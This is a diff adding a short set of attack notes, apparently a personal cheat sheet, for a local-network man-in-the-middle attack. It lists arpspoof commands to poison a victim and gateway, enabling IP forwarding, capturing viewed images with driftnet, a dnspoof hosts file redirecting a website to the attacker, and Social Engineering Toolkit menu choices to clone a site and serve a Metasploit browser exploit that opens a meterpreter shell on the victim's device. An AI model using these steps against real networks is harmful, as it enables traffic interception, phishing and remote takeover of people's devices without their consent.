@@ -1,0 +1,37 @@
+website link should be in format www.<website>.com
+
+Terminal 1
+        arpspoof -i eth6 -t <victimdefaultgateway> <victimip>
+Terminal 2
+        arpspoof -i eth6 -t <victimip> <victimdefaultgateway>
+
+Turn IP Forwarding
+        cat /proc/sys/net/ipv4/ip_forward
+                If it is 0 change it to 1
+
+To see all the images that will be seen through browser when it is loaded
+        drifnet -i eth6
+        To download the images just click on the images and it will directly be saved in your server
+
+Now to try DNS Cache poisoning
+        Create a file
+                nano <filename>
+                        <websitelink>        <attackerip>
+                        <attackerip>        <websitelink>
+        Save the file 
+        Run the command
+                dnspoof -i eth6 -f <addressoffilename>
+
+Use Social Engineering Toolkit to clone website and get in Device
+        Start Social Engineering Toolkit
+                Choose 1 for social engineering attack
+                Choose 2 for Website Attack Vector
+                Choose 2 for Metaspolit Browser Exploit Method
+                Choose 2 for Site Cloner
+                say no to NAT/portforwarding
+                Put ip as attacker ip
+                write the website name in format http://<websitename>.com
+                Choose 35 for Browser Autopawn
+                Choose 2 as TCP meterpreter
+                Put random port
+        When the victim Starts official facebook page its game over
